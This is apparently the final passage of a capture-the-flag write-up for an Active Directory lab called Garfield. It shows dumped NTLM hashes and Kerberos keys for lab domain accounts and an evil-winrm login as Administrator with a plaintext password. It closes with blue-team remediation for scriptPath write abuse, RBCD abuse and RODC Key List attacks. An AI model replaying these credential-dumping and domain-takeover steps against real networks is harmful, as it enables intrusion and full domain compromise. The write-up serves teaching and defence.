krbtgt:502:aad3b435b51404eeaad3b435b51404ee:077a59724e58efbf6608853652a66f80:::
krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::
garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:f705091e5d14d5c25ace5f52ea4d8ecb:::
garfield.htb\l.wilson:3105:aad3b435b51404eeaad3b435b51404ee:dc6e2c16d8baac7cc239f160783ae2b0:::
garfield.htb\l.wilson_adm:3107:aad3b435b51404eeaad3b435b51404ee:0ef3298edfc59e0cd07c56d829eea9c6:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:22acecfd924465afc92bf3c3631bbc91:::
RODC01$:1602:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::
FAKEBOX$:10601:aad3b435b51404eeaad3b435b51404ee:c16909555f24a7787bf9fb53310fcb84:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:53b9e15b84f5b44ca093b5a74098b26aae113a806a9a7ff647754dc6518e9c29
Administrator:aes128-cts-hmac-sha1-96:f0aaabf4238c8cb0cf30b123d15bc579
Administrator:des-cbc-md5:ce8067135851fdf1
krbtgt:aes256-cts-hmac-sha1-96:d11af60335016c1fb36af5f3a25932c669c776c7243f914e1c5639e910fbf165
krbtgt:aes128-cts-hmac-sha1-96:ef164918a0f52610a330572738133040
krbtgt:des-cbc-md5:323251d089c21589
krbtgt_8245:aes256-cts-hmac-sha1-96:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
krbtgt_8245:aes128-cts-hmac-sha1-96:124c0fd09f5fa4efca8d9f1da91369e5
krbtgt_8245:des-cbc-md5:d540fe6192b9ecfe
garfield.htb\j.arbuckle:aes256-cts-hmac-sha1-96:020479792c08b7ee98ea331fa17af63803127802cf9520270d41938bd4936564
garfield.htb\j.arbuckle:aes128-cts-hmac-sha1-96:3ca4723b81074249aaedf0c357466145
garfield.htb\j.arbuckle:des-cbc-md5:a4458994c2d508fd
garfield.htb\l.wilson:aes256-cts-hmac-sha1-96:1c7e4d672823d23306eae6a9342983998b73c6c7434aca0c01f5444bda3644f9
garfield.htb\l.wilson:aes128-cts-hmac-sha1-96:f9ebfbbedca92fa54796434b51bb1c6a
garfield.htb\l.wilson:des-cbc-md5:6b2f2a6efdd90729
garfield.htb\l.wilson_adm:aes256-cts-hmac-sha1-96:04bfec3b62804f51150f65017d2acf203cd2c9cc9db71e7215e3d434c8020c32
garfield.htb\l.wilson_adm:aes128-cts-hmac-sha1-96:e2da319c48d4826eaaafd827fc4cc101
garfield.htb\l.wilson_adm:des-cbc-md5:75c4d0b949a81a61
DC01$:aes256-cts-hmac-sha1-96:ea74859383fcf96a2b1b6b5ba4a19fe3984836fb6b6a9ae4aa20cf601f64aa7f
DC01$:aes128-cts-hmac-sha1-96:155ce5da0fdfd37dd81fc3ce057af4e5
DC01$:des-cbc-md5:8fd05434929ef791
RODC01$:aes256-cts-hmac-sha1-96:53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
RODC01$:aes128-cts-hmac-sha1-96:52432a8bdb5b11e64f3c9f53ef712b50
RODC01$:des-cbc-md5:469715524c1c02df
FAKEBOX$:aes256-cts-hmac-sha1-96:96dac49e1403a70f46c2e06f0914aa369fe9c33d02ec1cfc4fb2661a0d97f918
FAKEBOX$:aes128-cts-hmac-sha1-96:7f87ef4a9bb6233c0d81ddfa2a4fcacd
FAKEBOX$:des-cbc-md5:43f46d3b1ca7d58c
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

- 🔍 *Lets grab the shell now!*

```bash
evil-winrm -i 10.129.39.117 -u 'Administrator' -p 'lgoSWZnv0phWaNFu'
```

```text
Evil-WinRM shell v3.7
                                       
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline       
                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                  
                                       
Info: Establishing connection to remote endpoint                                          
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/18/2026   3:07 PM             34 root.txt
```

- 🔍 *Domain Compromised!*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Garfield lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Permissive AD Object Write Permissions (scriptPath)
> [!WARNING]
> **Vulnerability Profile:**
> Low-privileged domain accounts possess write permissions (`WRITE`) over critical user attributes (`scriptPath`, `profilePath`) of other users.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Allowing users to edit attributes that determine executable paths executed during session initialization is equivalent to arbitrary code execution. Attacking forces can assign custom payloads pointing to remote shares (SYSVOL, netlogon) to trigger reverse shell executions during normal logins.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Revoke permission rights of unprivileged users to modify attributes on other user objects. Restrict `scriptPath` edits strictly to Domain Administrators.
> - **Remediation:** Enforce strict file system access constraints over shared logon scripts in SYSVOL, preventing non-administrative users from modifying or writing batch files.
> - **Detection:** Audit Active Directory directories for changes to object attributes using tools like BloodHound or monitoring Event ID 5136 (A directory service object was modified).

---

### 🔴 Resource-Based Constrained Delegation (RBCD) Abuse
> [!WARNING]
> **Vulnerability Profile:**
> The domain's computer accounts permit delegated administrators (`RODC Administrators`) to write `msDS-AllowedToActOnBehalfOfOtherIdentity` configurations, defining arbitrary computer objects as trusted delegates.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Once an attacker controls the RBCD delegation attributes of a target computer account, they can request Kerberos service tickets impersonating any high-privileged domain accounts (e.g. Domain Administrator) to gain root access on the machine.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable standard users from registering new machine accounts by setting the domain-wide `MachineAccountQuota` to `0`.
> - **Remediation:** Strictly limit write access rights on computer object delegation properties to Domain Admins.
> - **Detection:** Alert on any updates modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer objects.

---

### 🔴 RODC Password Replication Policy (PRP) Misconfiguration & Key List Attacks
> [!WARNING]
> **Vulnerability Profile:**
> Highly privileged domain accounts (Domain Administrators) are allowed to be added to the Allowed RODC Password Replication Group (`msDS-RevealOnDemandGroup`) or removed from the Denied Replication Group (`msDS-NeverRevealGroup`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If an RODC's Kerberos signing key is compromised, attackers can forge Golden Tickets mimicking the RODC. If high-privileged accounts are added to the Allowed PRP list, the attacker can execute a Key List Attack to query the primary Domain Controller for the real Domain Administrator's password hashes, resulting in complete domain compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Guarantee that critical domain administrative groups (Domain Admins, Enterprise Admins, Schema Admins) are explicitly placed in the Denied RODC Password Replication Group.
> - **Remediation:** Apply rigid access rules restricting modifications of RODC replication groups.
> - **Detection:** Monitor Event ID 4692 (attempts to backup DPAPI master keys) and inspect domain controllers for anomalous KDC request sequences matching Key List replication patterns.
